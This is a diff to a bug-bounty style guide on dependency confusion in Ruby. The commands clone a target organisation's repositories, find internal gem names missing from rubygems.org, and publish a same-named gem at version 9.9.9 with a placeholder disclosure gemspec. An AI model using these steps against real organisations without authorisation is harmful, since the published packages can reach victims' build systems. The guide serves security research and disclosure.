@@ -26,12 +26,38 @@ $ ghorg clone <target> -t <token>
 ```bash
 $ find . -type f -name Gemfile | xargs -n1 -I{} cat {} | awk '/gem / {print}' | grep gem | cut -d "'" -f2 | sort -u | tr -d "'" | tr -d "," |  xargs -n1 -I{} echo "https://rubygems.org/gems/{}" |  httpx -status-code -silent -content-length -mc 404
 ```
-- 404 code means this package not available publicly, so this the vulnerable to dependencies confusion.
-- Then must be must be cross checking using github dorking - `org:intel package_name`
+- 404 code means this package not available publicly, so this the vulnerable to dependencies confusion attack.
+    
+- Then must be cross checking using github dorking - `org:microsoft package_name`
     
 - So now Publish this ruby packages publicly (https://rubygems.org)
-
-
+    
+```bash
+$ bundle gem <package_name>
+```
+- Everything set default
+    
+```bash
+$ cd <package_name>
+```
+```bash
+$ nano <package_name>.gem
+```
+- Replaced -
+    ```bash
+    Gem::Specification.new do |s|
+  s.name        = "<package_name>"
+  s.version     = "9.9.9"
+  s.summary     = "Vulnerability Disclosure: Dependency confiuse vulnerability"
+  s.description = "This Ruby package vulnerable to dependency confiuse vulnerability"
+  s.authors     = ["Anindya Ghoshal"]
+  s.email       = "techghoshal@gmail.com"
+  s.files       = ["lib/mygem.rb"]
+  s.homepage    =
+    "https://rubygems.org/gems/<package_name>"
+  s.license       = "MIT"
+end
+```
     
     
  
